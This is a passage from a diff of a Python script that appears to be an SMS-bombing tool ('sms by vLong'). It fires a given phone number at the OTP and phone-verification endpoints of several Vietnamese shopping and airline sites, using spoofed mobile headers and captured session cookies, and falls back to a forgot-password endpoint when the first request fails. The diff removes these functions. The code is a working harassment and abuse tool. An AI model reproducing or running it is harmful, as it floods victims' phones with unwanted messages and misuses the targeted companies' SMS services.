-		"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
-		"Accept": "application/json, text/plain, */*",
-		"Content-Type": "application/json",
-		"sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Chromium\";v=\"124\"",
-		"sec-ch-ua-mobile": "?1",
-		"timestamp": "1716264027567",
-		"signature": "ed9dd00052e6b2d40efac169217d7739",
-		"sec-ch-ua-platform": "\"Android\"",
-		"origin": "https://tokyolife.vn",
-		"sec-fetch-site": "same-site",
-		"sec-fetch-mode": "cors",
-		"sec-fetch-dest": "empty",
-		"referer": "https://tokyolife.vn/",
-		"accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5"
-	}
-		
-	response = requests.post(url, data=payload, headers=headers)
-		
-	if response.status_code == 400:
-		response = requests.post(url2, data=payload2, headers=headers2)
-		
-		return dict(status=response.status_code, content=response.text)
-	else:
-		return dict(status=response.status_code, content=response.text)
-
-def VsTeamHttpRequests61(phone):
-	url = "https://cms.gumac.vn/api/v1/customers/verify-phone-number"
-
-	payload = json.dumps({
-		"phone": phone
-	})
-		
-	headers = {
-		"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
-		"Accept": "application/json",
-		"Content-Type": "application/json",
-		"sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Chromium\";v=\"124\"",
-		"sec-ch-ua-mobile": "?1",
-		"sec-ch-ua-platform": "\"Android\"",
-		"Origin": "https://gumac.vn",
-		"Sec-Fetch-Site": "same-site",
-		"Sec-Fetch-Mode": "cors",
-		"Sec-Fetch-Dest": "empty",
-		"Referer": "https://gumac.vn/",
-		"Accept-Language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
-		# "Cookie": "PHPSESSID=v74hsdsubqcf89vacjm0e3n2ke"
-	}
-		
-	response = requests.post(url, data=payload, headers=headers)
-		
-	return dict(status=response.status_code, content=response.text)
-def VsTeamHttpRequests62(phone):
-	url = "https://hoang-phuc.com/advancedlogin/otp/sendotp/"
-
-	payload = f"action_type=1&tel={phone}"
-		
-	headers = {
-		"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
-		"Accept": "application/json, text/javascript, */*; q=0.01",
-		"Content-Type": "application/x-www-form-urlencoded",
-		"sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Chromium\";v=\"124\"",
-		"x-newrelic-id": "UAcAUlZSARABVFlaBQYEVlUD",
-		"tracestate": "1322840@nr=0-1-4173019-1120237972-2f76f2d298821976----1716265725675",
-		"traceparent": "00-50648510533c824a7aba54e73786266f-2f76f2d298821976-01",
-		"sec-ch-ua-mobile": "?1",
-		"newrelic": "eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjQxNzMwMTkiLCJhcCI6IjExMjAyMzc5NzIiLCJpZCI6IjJmNzZmMmQyOTg4MjE5NzYiLCJ0ciI6IjUwNjQ4NTEwNTMzYzgyNGE3YWJhNTRlNzM3ODYyNjZmIiwidGkiOjE3MTYyNjU3MjU2NzUsInRrIjoiMTMyMjg0MCJ9fQ==",
-		"x-requested-with": "XMLHttpRequest",
-		"sec-ch-ua-platform": "\"Android\"",
-		"origin": "https://hoang-phuc.com",
-		"sec-fetch-site": "same-origin",
-		"sec-fetch-mode": "cors",
-		"sec-fetch-dest": "empty",
-		"referer": "https://hoang-phuc.com/customer/account/create/",
-		"accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
-		"Cookie": "PHPSESSID=8c9babb713e086251543e119b1e6ba4b; form_key=JWVmJDeh5EMyXPN6; mage-banners-cache-storage={}; mage-cache-storage={}; mage-cache-storage-section-invalidation={}; mage-cache-sessid=true; form_key=JWVmJDeh5EMyXPN6; recently_viewed_product={}; recently_viewed_product_previous={}; recently_compared_product={}; recently_compared_product_previous={}; product_data_storage={}; _gcl_au=1.1.1094982322.1716265400; _pk_ses.564990520.6493=*; _fbp=fb.1.1716265400352.441126268; cdp_session=1; _ac_au_gt=1716265401815; _ga=GA1.1.658532119.1716265406; au_id=1492242163; cdp_blocked_sid_16282890=true; _asm_visitor_type=r; section_data_ids={}; mage-messages=; _pk_id.564990520.6493=1492242163.1716265400.1.1716265690.1716265400.; _ac_client_id=1492242163.1716265691; _asm_ss_view=%7B%22time%22%3A1716265406598%2C%22sid%22%3A%223753762300356011%22%2C%22utime%22%3A%222024-05-21T04%3A28%3A11%22%2C%22duration%22%3A284919%2C%22page_view_order%22%3A2%7D; _ac_an_session=zgzkzmzgzkzlzhzgzjzjzgzmzlzjzizizdziznzqzhzhznzhzizlzgzdzizkzizlzhzlzmzlzqzizdzizdzizkzizlzhzlzmzlzqzizdzizkzizlzhzlzmzlzqzizdzizdzizmzdzgzd2f27zdzgzdzlzmzkzjzlzdzd2x1vz8341v271x; _ga_48P0WR3P2C=GS1.1.1716265406.1.1.1716265691.6.0.0; private_content_version=18012186bba5dcdee8ca210c83ebbba2"
-	}
-		
-	response = requests.post(url, data=payload, headers=headers)
-		
-	return dict(status=response.status_code, content=response.text)
-	
-def VsTeamHttpRequests62(phone):
-	url = "https://www.acfc.com.vn/mgn_customer/customer/sendOTP"
-	
-	payload = f"number_phone={phone}&form_key=xHILvhucAGA9ART4&currentUrl=https%3A%2F%2Fwww.acfc.com.vn%2Fcustomer%2Faccount%2Fcreate%2F"
-	payload2 = f"number_phone={phone}&form_key=xHILvhucAGA9ART4&currentUrl=https%3A%2F%2Fwww.acfc.com.vn%2Fcustomer%2Faccount%2Fforgotpassword%2F"
-	
-	headers = {
-		"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
-		"Accept": "application/json, text/javascript, */*; q=0.01",
-		"Content-Type": "application/x-www-form-urlencoded",
-		"sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Chromium\";v=\"124\"",
-		"x-requested-with": "XMLHttpRequest",
-		"sec-ch-ua-mobile": "?1",
-		"sec-ch-ua-platform": "\"Android\"",
-		"origin": "https://www.acfc.com.vn",
-		"sec-fetch-site": "same-origin",
-		"sec-fetch-mode": "cors",
-		"sec-fetch-dest": "empty",
-		"referer": "https://www.acfc.com.vn/customer/account/create/",
-		"accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
-		"Cookie": "PHPSESSID=t51fr9f7gh8g7s6amda7au5sb6; _evga_d955={%22uuid%22:%22cb02c099db0fcea7%22}; _gcl_au=1.1.290759278.1716266986; _ga=GA1.1.962583424.1716266991; _tt_enable_cookie=1; _ttp=IggJDYEmsxjdZ8PKyWKoefqZ9Q2; form_key=xHILvhucAGA9ART4; _fbp=fb.2.1716267002092.1853563563; mage-banners-cache-storage={}; mage-cache-storage={}; mage-cache-storage-section-invalidation={}; mage-cache-sessid=true; _sfid_599e={%22anonymousId%22:%22cb02c099db0fcea7%22%2C%22consents%22:[]}; recently_viewed_product={}; recently_viewed_product_previous={}; recently_compared_product={}; recently_compared_product_previous={}; product_data_storage={}; mage-messages=; form_key=xHILvhucAGA9ART4; optiMonkClientId=5cccf917-3251-8455-2c80-4a3c76819355; __zi=2000.SSZzejyD6TqjYRAYrWCPo2p6iFR8JHVGRfgY_DPVLS9uYAsYtruHYtY9fA_TMnBFU8kcvTrL5Sf_XABaC0.1; private_content_version=9c156a2d16b00e71797344322cd12bbd; mgn_location_popup=northern; X-Magento-Vary=1ddad410eaca51b03769e808dd64a9f5d99394014aa66dff5039509923b47ad1; optiMonkSession=1716267031; optiMonkClient=N4IgjArAnGAcUgFygMYEMnAL4BoQDMA3JMAdjADYAmC0gBjDrwBtjEzKb6Iw8A7APYAHNgBYsWIA; _ga_PS7MEHMFY3=GS1.1.1716266991.1.1.1716267052.60.0.0"
-	}
-	
-	headers2 = {
-		"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
-		"Accept": "application/json, text/javascript, */*; q=0.01",
-		"Content-Type": "application/x-www-form-urlencoded",
-		"sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Chromium\";v=\"124\"",
-		"x-requested-with": "XMLHttpRequest",
-		"sec-ch-ua-mobile": "?1",
-		"sec-ch-ua-platform": "\"Android\"",
-		"origin": "https://www.acfc.com.vn",
-		"sec-fetch-site": "same-origin",
-		"sec-fetch-mode": "cors",
-		"sec-fetch-dest": "empty",
-		"referer": "https://www.acfc.com.vn/customer/account/forgotpassword/",
-		"accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
-		"Cookie": "PHPSESSID=t51fr9f7gh8g7s6amda7au5sb6; _gcl_au=1.1.290759278.1716266986; _ga=GA1.1.962583424.1716266991; _tt_enable_cookie=1; _ttp=IggJDYEmsxjdZ8PKyWKoefqZ9Q2; form_key=xHILvhucAGA9ART4; _fbp=fb.2.1716267002092.1853563563; mage-cache-storage={}; mage-cache-storage-section-invalidation={}; mage-cache-sessid=true; _sfid_599e={%22anonymousId%22:%22cb02c099db0fcea7%22%2C%22consents%22:[]}; recently_viewed_product={}; recently_viewed_product_previous={}; recently_compared_product={}; recently_compared_product_previous={}; product_data_storage={}; mage-messages=; form_key=xHILvhucAGA9ART4; optiMonkClientId=5cccf917-3251-8455-2c80-4a3c76819355; __zi=2000.SSZzejyD6TqjYRAYrWCPo2p6iFR8JHVGRfgY_DPVLS9uYAsYtruHYtY9fA_TMnBFU8kcvTrL5Sf_XABaC0.1; mgn_location_popup=northern; X-Magento-Vary=1ddad410eaca51b03769e808dd64a9f5d99394014aa66dff5039509923b47ad1; _evga_d955={%22uuid%22:%22cb02c099db0fcea7%22%2C%22puid%22:%229kTy4sKZkv0SAsDUaFGzcTeQnks2HSZYhrXST2aXkKw03JdQWOHWXXPFnVoezISdjsHyXFYDUb-lQCXVson-PjNwP22QYx6KuKxxbDTa6-o%22%2C%22affinityId%22:%220Ce%22}; private_content_version=9ad1c8937268a10306fa489932ed5fe0; section_data_ids={}; optiMonkSession=1716267319; _ga_PS7MEHMFY3=GS1.1.1716266991.1.1.1716267348.29.0.0; optiMonkClient=N4IgjArAnGAcUgFygMYEMmjANgEyZDRQBckAGAGkIAdqkwB2HXbBgZhapQCckRtsAFgBGZACbYJAUzYpRZMrkEMUKKYIggqAOwD2Y+lQDOfFABtdRqQYC+NqgDMAbvSZ5WZMJRBmXiRsysbIJQOrrUfth2QA"
-	}
-		
-	response = requests.post(url, data=payload, headers=headers)
-	
-	if response.json().get("error"):
-		response = requests.post(url, data=payload2, headers=headers2)
-		
-		return dict(status=response.status_code, content=response.text)
-	else:
-		return dict(status=response.status_code, content=response.text)
-		
-def VsTeamHttpRequests63(phone):
-	url = "https://vietair.com.vn/Handler/CoreHandler.ashx"
-
-	payload = f"op=PACKAGE_HTTP_POST&path_ajax_post=%2Fservice03%2Fsms%2Fget&package_name=PK_FD_SMS_OTP&object_name=INS&P_MOBILE={phone}&P_TYPE_ACTIVE_CODE=DANG_KY_NHAN_OTP"
-		
-	headers = {
-		"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
-		"Accept": "application/json, text/javascript, */*; q=0.01",
-		"Content-Type": "application/x-www-form-urlencoded",
-		"sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Chromium\";v=\"124\"",
-		"x-requested-with": "XMLHttpRequest",
-		"sec-ch-ua-mobile": "?1",
-		"sec-ch-ua-platform": "\"Android\"",
-		"origin": "https://vietair.com.vn",
-		"sec-fetch-site": "same-origin",
-		"sec-fetch-mode": "cors",
-		"sec-fetch-dest": "empty",
-		"referer": "https://vietair.com.vn/khach-hang-than-quen/dang-ky",
-		"accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
-		"Cookie": "_gcl_au=1.1.749309239.1716223603; _gid=GA1.3.1954334173.1716223604; set-show-banner-app=true; counter-show-banner-app=0; _tt_enable_cookie=1; _ttp=ZcF7f0Y61ZgUD6P8HIi65cWwxho; _fbp=fb.2.1716223627581.2060308024; _dc_gtm_UA-46676256-1=1; _ga=GA1.1.1362514480.1716223604; _ga_R4WM78RL0C=GS1.1.1716223604.1.1.1716223786.55.0.0"
-	}
-		
-	response = requests.post(url, data=payload, headers=headers)
-		
-	return dict(status=response.status_code, content=response.text)
-run(phone)
+run(sdt_vs)
+print("sms by vLong")
